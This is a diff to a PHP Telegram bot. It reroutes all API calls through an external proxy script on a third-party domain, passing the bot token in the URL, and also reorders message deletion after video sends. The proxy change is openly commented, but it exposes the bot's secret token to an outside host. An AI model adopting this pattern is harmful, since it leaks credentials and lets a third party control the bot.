@@ -5,7 +5,9 @@ if (!file_exists(__DIR__ . '/config.php')) {
 require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/gregorian_jalali.php';
 define('BOT_TOKEN', $botToken);  // Bot token for authentication with Telegram API
-define('TELEGRAM_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');  // Base URL for Telegram Bot API
+// define('TELEGRAM_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');  // Base URL for Telegram Bot API
+// // All tg() calls are tunneled through external proxy script
+define('TELEGRAM_URL', 'https://mehdisalari.ir/bot/tgtunnel.php?bot_token=' . BOT_TOKEN . '&method=');
 
 function tg($method, $params = []) {
     if (!$params) {
@@ -173,12 +175,12 @@ function getDownloadLinks($platform = null) {
     }
 
     $response = match ($platform) {
-      "android" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'Android')),
-      "ios" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'iOS')),
-      "windows" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'Windows')),
-      "mac" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'Mac')),
-      "linux" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'Linux')),
-      default => json_encode($data),
+        "android" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'Android')),
+        "ios" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'iOS')),
+        "windows" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'Windows')),
+        "mac" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'Mac')),
+        "linux" => json_encode(array_filter($data, fn($item) => $item['platform'] === 'Linux')),
+        default => json_encode($data),
     };
 
     return $response;
@@ -220,10 +222,6 @@ function guide($action) {
                 ]);
                 exit();
             }
-            tg('deleteMessage',[
-                'chat_id' => $uid,
-                'message_id' => $cbmid
-            ]);
             
             $result = tg('sendVideo',[
                 'chat_id' => $uid,
@@ -235,6 +233,11 @@ function guide($action) {
                         ],
                     ]
                 ])
+            ]);
+
+            tg('deleteMessage',[
+                'chat_id' => $uid,
+                'message_id' => $cbmid
             ]);
 
             if (!($result = json_decode($result))->ok) {
@@ -274,10 +277,7 @@ function guide($action) {
                 ]);
                 exit();
             }
-            tg('deleteMessage',[
-                'chat_id' => $uid,
-                'message_id' => $cbmid
-            ]);
+            
             $result = tg('sendVideo',[
                 'chat_id' => $uid,
                 'video'   => new CURLFile($videoPath, 'video/mp4', 'guide.mp4'),
@@ -288,6 +288,11 @@ function guide($action) {
                         ],
                     ]
                 ])
+            ]);
+
+            tg('deleteMessage',[
+                'chat_id' => $uid,
+                'message_id' => $cbmid
             ]);
 
             if (!($result = json_decode($result))->ok) {
